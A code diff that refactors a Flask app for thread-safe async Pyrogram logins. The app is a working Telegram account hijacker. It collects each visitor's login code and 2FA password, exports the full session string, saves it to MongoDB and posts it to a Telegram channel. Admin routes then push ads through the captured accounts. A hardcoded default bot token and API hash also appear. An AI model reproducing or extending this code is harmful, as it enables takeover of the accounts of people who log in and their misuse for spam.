@@ -2,6 +2,7 @@ from flask import Flask, render_template, request, session, redirect, jsonify, u
 import os
 import uuid
 import asyncio
+import threading
 from datetime import datetime, timedelta
 from pyrogram import Client
 from pyrogram.errors import (
@@ -35,11 +36,7 @@ except Exception as e:
     db = None
     db_connected = False
 
-# OLD (broken):
-#users_col = db.users if db else None
-#ads_config_col = db.ads_config if db else None
-
-# NEW (fixed):
+# Fixed collection references
 users_col = db.users if db is not None else None
 ads_config_col = db.ads_config if db is not None else None
 
@@ -60,13 +57,33 @@ API_HASH = os.environ.get("API_HASH", "628f11c05a44c8dda4b006e66f4bf7df")
 BOT_TOKEN = os.environ.get("BOT_TOKEN", "8991327348:AAH3uOzXU8aZZ2LKfUlK1MH4Wp2AYKo1aIs")
 CHANNEL_ID = os.environ.get("CHANNEL_ID", "-1004376082945")
 
+# Thread-safe storage for temporary client sessions
 clients = {}
+clients_lock = threading.Lock()
+
+def run_async(coro):
+    """Helper to run async code in Flask"""
+    try:
+        loop = asyncio.get_event_loop()
+        if loop.is_running():
+            # If we're in an already running loop, create a new one in a thread
+            new_loop = asyncio.new_event_loop()
+            t = threading.Thread(target=lambda: new_loop.run_until_complete(coro))
+            t.start()
+            t.join()
+            return None
+        else:
+            return loop.run_until_complete(coro)
+    except RuntimeError:
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        return loop.run_until_complete(coro)
 
 # ========== DATABASE HELPERS ==========
 def save_session_to_db(session_data):
     if users_col is None:
         return False
-    
+
     try:
         existing = users_col.find_one({"phone": session_data["phone"]})
         if existing:
@@ -114,7 +131,7 @@ def get_ads_config():
             "caption": "",
             "updated_at": datetime.now()
         }
-    
+
     config = ads_config_col.find_one({"_id": "main_config"})
     if not config:
         default_config = {
@@ -149,21 +166,21 @@ def get_stats():
             "total_ads_sent": 0,
             "db_connected": False
         }
-    
+
     total = users_col.count_documents({})
     active = users_col.count_documents({"status": "active"})
     idle = users_col.count_documents({"status": "idle"})
-    
+
     pipeline = [{"$group": {"_id": None, "total": {"$sum": "$total_ads_sent"}}}]
     ads_result = list(users_col.aggregate(pipeline))
     total_ads = ads_result[0]["total"] if ads_result else 0
-    
+
     yesterday = datetime.now() - timedelta(days=1)
     recent_users = users_col.count_documents({"created_at": {"$gte": yesterday}})
-    
+
     last_hour = datetime.now() - timedelta(hours=1)
     online_users = users_col.count_documents({"last_ad_time": {"$gte": last_hour}})
-    
+
     return {
         "total_users": total,
         "active_users": active,
@@ -177,7 +194,7 @@ def get_stats():
 def get_all_users():
     if users_col is None:
         return []
-    
+
     users = list(users_col.find().sort("created_at", -1))
     formatted = []
     for user in users:
@@ -232,41 +249,48 @@ def send_code():
         return jsonify(ok=False, error="Invalid phone number"), 400
 
     session_id = str(uuid.uuid4())[:8]
+    
+    async def send_code_async():
+        client = Client(
+            name=f"session_{session_id}",
+            api_id=API_ID,
+            api_hash=API_HASH,
+            in_memory=True,
+            no_updates=True
+        )
+        
+        try:
+            await client.connect()
+            sent = await client.send_code(phone)
+            
+            with clients_lock:
+                clients[session_id] = {
+                    "client": client,
+                    "phone": phone,
+                    "session_name": session_name,
+                    "phone_code_hash": sent.phone_code_hash
+                }
+            return {"ok": True, "session_id": session_id, "message": f"Code sent to {phone}"}
+        except PhoneNumberInvalid:
+            await client.disconnect()
+            return {"ok": False, "error": "Invalid phone number"}
+        except FloodWait as e:
+            await client.disconnect()
+            return {"ok": False, "error": f"Wait {e.value} seconds"}
+        except Exception as e:
+            await client.disconnect()
+            return {"ok": False, "error": str(e)}
+    
+    # Run async code properly
     loop = asyncio.new_event_loop()
-    asyncio.set_event_loop(loop)
-
-    client = Client(
-        name=f"session_{session_id}",
-        api_id=API_ID,
-        api_hash=API_HASH,
-        in_memory=True,
-        no_updates=True
-    )
-
     try:
-        async def send():    
-            await client.connect()    
-            sent = await client.send_code(phone)    
-            return sent    
-
-        sent_code = loop.run_until_complete(send())    
-
-        clients[session_id] = {    
-            "client": client,    
-            "phone": phone,    
-            "session_name": session_name,    
-            "phone_code_hash": sent_code.phone_code_hash,    
-            "loop": loop    
-        }    
-
-        return jsonify(ok=True, session_id=session_id, message=f"Code sent to {phone}")
-
-    except PhoneNumberInvalid:
-        return jsonify(ok=False, error="Invalid phone number"), 400
-    except FloodWait as e:
-        return jsonify(ok=False, error=f"Wait {e.value} seconds"), 429
-    except Exception as e:
-        return jsonify(ok=False, error=str(e)), 500
+        result = loop.run_until_complete(send_code_async())
+        if result.get("ok"):
+            return jsonify(result)
+        else:
+            return jsonify(result), 400 if "Invalid" in result.get("error", "") else 429 if "Wait" in result.get("error", "") else 500
+    finally:
+        loop.close()
 
 @app.route("/api/verify-code", methods=["POST"])
 def verify_code():
@@ -275,23 +299,25 @@ def verify_code():
     code = data.get("code", "").strip()
     password = data.get("password", "")
 
-    if not session_id or session_id not in clients:
+    if not session_id:
+        return jsonify(ok=False, error="Session ID required"), 400
+
+    with clients_lock:
+        client_data = clients.get(session_id)
+    
+    if not client_data:
         return jsonify(ok=False, error="Session expired"), 400
 
     if not code:
         return jsonify(ok=False, error="Invalid code"), 400
 
-    client_data = clients[session_id]
     client = client_data["client"]
     phone = client_data["phone"]
     phone_code_hash = client_data["phone_code_hash"]
     session_name = client_data["session_name"]
-    loop = client_data["loop"]
 
-    asyncio.set_event_loop(loop)
-
-    try:
-        async def do_sign_in():
+    async def verify_async():
+        try:
             try:
                 user = await client.sign_in(
                     phone_number=phone,
@@ -300,38 +326,58 @@ def verify_code():
                 )
                 session_string = await client.export_session_string()
                 await client.disconnect()
-                return user, session_string, None
+                return {"user": user, "session_string": session_string, "error": None}
             except SessionPasswordNeeded:
                 if not password:
-                    return None, None, "2FA_PASSWORD_REQUIRED"
+                    return {"user": None, "session_string": None, "error": "2FA_PASSWORD_REQUIRED"}
                 user = await client.check_password(password)
                 session_string = await client.export_session_string()
                 await client.disconnect()
-                return user, session_string, None
+                return {"user": user, "session_string": session_string, "error": None}
+        except PhoneCodeInvalid:
+            return {"user": None, "session_string": None, "error": "INVALID_CODE"}
+        except PhoneCodeExpired:
+            return {"user": None, "session_string": None, "error": "CODE_EXPIRED"}
+        except Exception as e:
+            return {"user": None, "session_string": None, "error": str(e)}
 
-        user, session_string, error = loop.run_until_complete(do_sign_in())    
+    loop = asyncio.new_event_loop()
+    try:
+        result = loop.run_until_complete(verify_async())
+        
+        if result["error"] == "2FA_PASSWORD_REQUIRED":
+            return jsonify(ok=False, requires_password=True), 401
+        elif result["error"] == "INVALID_CODE":
+            return jsonify(ok=False, error="Invalid code"), 401
+        elif result["error"] == "CODE_EXPIRED":
+            with clients_lock:
+                clients.pop(session_id, None)
+            return jsonify(ok=False, error="Code expired"), 401
+        elif result["error"]:
+            return jsonify(ok=False, error=result["error"]), 500
 
-        if error == "2FA_PASSWORD_REQUIRED":    
-            return jsonify(ok=False, requires_password=True), 401    
-
-        user_info = {    
-            "id": user.id,    
-            "first_name": user.first_name,    
-            "last_name": user.last_name or "",    
-            "username": user.username or "N/A",    
-            "phone": phone,    
-            "session_string": session_string,    
-            "created_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),    
-            "session_name": session_name    
-        }    
+        user = result["user"]
+        session_string = result["session_string"]
+        
+        user_info = {
+            "id": user.id,
+            "first_name": user.first_name,
+            "last_name": user.last_name or "",
+            "username": user.username or "N/A",
+            "phone": phone,
+            "session_string": session_string,
+            "created_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+            "session_name": session_name
+        }
 
         db_id = save_session_to_db(user_info)
         if db_id:
             print(f"✅ User saved to MongoDB with ID: {db_id}")
 
-        del clients[session_id]    
+        with clients_lock:
+            clients.pop(session_id, None)
 
-        country_code = phone[:3] if phone.startswith("+") else phone[:2]    
+        country_code = phone[:3] if phone.startswith("+") else phone[:2]
 
         channel_msg = f"""🟢 <b>NEW PYROGRAM SESSION</b>
 
@@ -351,22 +397,16 @@ def verify_code():
 <code>{session_string}</code>"""
 
         send_to_channel(channel_msg)
-        session["user"] = user_info    
+        session["user"] = user_info
 
-        return jsonify(ok=True, user={    
-            "id": user_info["id"],    
-            "name": f"{user_info['first_name']} {user_info['last_name']}",    
-            "username": user_info["username"],    
-            "phone": phone    
+        return jsonify(ok=True, user={
+            "id": user_info["id"],
+            "name": f"{user_info['first_name']} {user_info['last_name']}",
+            "username": user_info["username"],
+            "phone": phone
         })
-
-    except PhoneCodeInvalid:
-        return jsonify(ok=False, error="Invalid code"), 401
-    except PhoneCodeExpired:
-        del clients[session_id]
-        return jsonify(ok=False, error="Code expired"), 401
-    except Exception as e:
-        return jsonify(ok=False, error=str(e)), 500
+    finally:
+        loop.close()
 
 @app.route("/api/logout", methods=["POST"])
 def logout():
@@ -397,74 +437,70 @@ def admin_stats_page():
 def toggle_ads():
     config = get_ads_config()
     new_status = not config.get("ads_enabled", False)
-    
-    if update_ads_config({"ads_enabled": new_status}):
-        # OLD:
-#if users_col:
-    #users_col.update_many({}, {"$set": #{"ads_enabled": new_status}})
 
-# NEW:
-if users_col is not None:
-    users_col.update_many({}, {"$set": {"ads_enabled": new_status}})
-        
+    if update_ads_config({"ads_enabled": new_status}):
+        # Fixed indentation - this block is now properly inside the if statement
+        if users_col is not None:
+            users_col.update_many({}, {"$set": {"ads_enabled": new_status}})
+
         return jsonify({
             "success": True,
             "enabled": new_status,
             "message": f"Ads {'enabled' if new_status else 'disabled'} successfully!"
         })
-    
+
     return jsonify({"success": False, "error": "Failed to update"}), 500
 
 @app.route("/api/set-interval", methods=["POST"])
 def set_interval():
     interval = request.json.get("interval")
-    
+
     if not interval or not isinstance(interval, int):
         return jsonify({"success": False, "error": "Invalid interval"}), 400
-    
+
     if update_ads_config({"interval": interval}):
         return jsonify({
             "success": True,
             "interval": interval,
             "message": f"Interval set to {interval//60} minutes!"
         })
-    
+
     return jsonify({"success": False, "error": "Failed to update"}), 500
 
 @app.route("/api/set-caption", methods=["POST"])
 def set_caption():
     caption = request.json.get("caption", "")
-    
+
     if update_ads_config({"caption": caption}):
         return jsonify({
             "success": True,
             "message": "Caption updated successfully!"
         })
-    
+
     return jsonify({"success": False, "error": "Failed to update"}), 500
 
 @app.route("/api/upload-photo", methods=["POST"])
 def upload_photo():
     if 'photo' not in request.files:
         return jsonify({"success": False, "error": "No file provided"}), 400
-    
+
     file = request.files['photo']
     if file.filename == '':
         return jsonify({"success": False, "error": "No file selected"}), 400
-    
+
     if file and allowed_file(file.filename):
         filename = secure_filename(f"ad_photo_{datetime.now().strftime('%Y%m%d_%H%M%S')}.{file.filename.rsplit('.', 1)[1]}")
         filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
         file.save(filepath)
-        
+
         update_ads_config({"photo_path": filepath})
-        
+
         return jsonify({
             "success": True,
             "path": filepath,
             "message": "Photo uploaded successfully!"
         })
-    
+
     return jsonify({"success": False, "error": "Invalid file type"}), 400
 
 @app.route("/api/preview")
@@ -486,18 +522,21 @@ def serve_upload(filename):
 def toggle_user_ads(user_id):
     if users_col is None:
         return jsonify({"success": False, "error": "DB not connected"}), 500
-    
-    user = users_col.find_one({"_id": ObjectId(user_id)})
-    
+
+    try:
+        user = users_col.find_one({"_id": ObjectId(user_id)})
+    except:
+        return jsonify({"success": False, "error": "Invalid user ID"}), 400
+
     if not user:
         return jsonify({"success": False, "error": "User not found"}), 404
-    
+
     new_status = not user.get("ads_enabled", True)
     users_col.update_one(
         {"_id": ObjectId(user_id)},
         {"$set": {"ads_enabled": new_status}}
     )
-    
+
     return jsonify({
         "success": True,
         "enabled": new_status,
